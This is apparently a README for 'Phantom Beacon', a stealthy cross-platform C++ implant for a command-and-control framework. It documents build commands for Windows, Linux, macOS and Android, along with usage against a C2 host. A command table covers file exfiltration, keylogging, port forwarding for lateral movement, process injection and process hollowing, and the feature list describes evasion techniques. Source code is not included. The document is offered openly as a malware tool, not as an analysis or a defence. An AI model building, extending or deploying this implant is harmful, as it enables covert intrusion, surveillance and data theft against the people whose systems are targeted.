# Phantom Beacon — Cross-Platform C++ Agent

## Overview
Highly performant, stealthy C++ beacon/implant for the Phantom C2 framework.
Supports **Windows**, **Linux**, **macOS**, and **Android** from a single codebase.

**Features:**
- **Evasion**: Dynamic API resolution via PEB walk (Windows), compile-time XOR string obfuscation (all platforms)
- **Crypto**: AES-256-CBC — BCrypt/CNG on Windows, OpenSSL on POSIX — zero runtime deps when statically linked
- **Network**: WinHTTP (Windows) / libcurl (POSIX) with user-agent rotation and sleep/jitter
- **Recon**: Drive/mount enumeration, directory traversal, sensitive path detection
- **Port Forwarding**: Internal TCP relay for lateral movement (Winsock/POSIX sockets)
- **File Transfer**: Download/upload files from/to the target
- **Keylogger**: Context-aware keylogging on Windows (GetAsyncKeyState); stub on POSIX

## Building

### Windows (MSVC)
```bat
mkdir build && cd build
cmake .. -G "Visual Studio 17 2022" -A x64
cmake --build . --config Release
```

### Windows (MinGW-w64 from Linux)
```bash
x86_64-w64-mingw32-g++ -std=c++17 -O2 -s -o beacon.exe src/main.cpp \
    -lwinhttp -lbcrypt -lws2_32 -static
```

### Linux
```bash
g++ -std=c++17 -O2 -s -o beacon_linux src/main.cpp \
    -lcurl -lssl -lcrypto -lpthread
```

### macOS
```bash
clang++ -std=c++17 -O2 -o beacon_macos src/main.cpp \
    -lcurl -lssl -lcrypto -lpthread -framework CoreGraphics
```

### Android (NDK)
```bash
$NDK_CC -std=c++17 -O2 -s -o beacon_android src/main.cpp -static
```

## Usage
```
# Windows
beacon.exe <c2_host> <c2_port>

# Linux / macOS / Android
./beacon <c2_host> <c2_port>
```

## Supported Commands (from C2)

| Command | Description |
|---------|-------------|
| `recon [path]` | Full FS recon (drives + critical paths + optional dir listing) |
| `ls <path>` | List directory contents |
| `drives` | Enumerate logical drives / mount points |
| `whoami` | Get current user and hostname |
| `download <file>` | Exfiltrate a file (base64-encoded) |
| `upload <file> <b64>` | Write a file to the target |
| `portfwd <lport> <rhost> <rport>` | Start TCP port forward |
| `portfwd-stop` | Stop all active port forwards |
| `keylog <start\|stop\|dump>` | Context-aware keylogger (Windows) |
| `sleep <ms>` | Change beacon sleep interval |
| `exit` | Terminate the beacon |
| `inject <pid>` | Inject beacon shellcode into running PID. Original STAYS → 2 beacons |
| `migrate` | Process hollow: spawn RuntimeBroker.exe, replace with beacon. Original EXITS → 1 beacon |

## Architecture
```
main.cpp          Entry point + beacon loop + command dispatch (cross-platform)
├── evasion.h     PEB walk (Windows), XOR string obfuscation (all platforms)
├── crypto.h      AES-256-CBC: BCrypt (Windows) / OpenSSL (POSIX), Base64, PKCS7
├── network.h     WinHTTP (Windows) / libcurl (POSIX), sleep/jitter, UA rotation
├── recon.h       FS enumeration (Win32 API / POSIX dirent), critical path detection
├── portfwd.h     TCP port forwarding (Winsock / POSIX sockets)
└── keylogger.h   Context-aware keylogger (Windows) / stub (POSIX)
```

## Platform Support Matrix

| Feature | Windows | Linux | macOS | Android |
|---------|---------|-------|-------|---------|
| Beacon Loop | ✅ | ✅ | ✅ | ✅ |
| AES-256-CBC | ✅ BCrypt | ✅ OpenSSL | ✅ OpenSSL | ✅ OpenSSL |
| HTTP/HTTPS | ✅ WinHTTP | ✅ libcurl | ✅ libcurl | ✅ libcurl |
| File Ops | ✅ Win32 | ✅ fstream | ✅ fstream | ✅ fstream |
| Recon | ✅ Full | ✅ Full | ✅ Full | ✅ Full |
| Port Fwd | ✅ Winsock | ✅ POSIX | ✅ POSIX | ✅ POSIX |
| Keylogger | ✅ Full | ⚠️ Stub | ⚠️ Stub | ❌ N/A |
| Evasion | ✅ PEB+XOR | ✅ XOR | ✅ XOR | ✅ XOR |
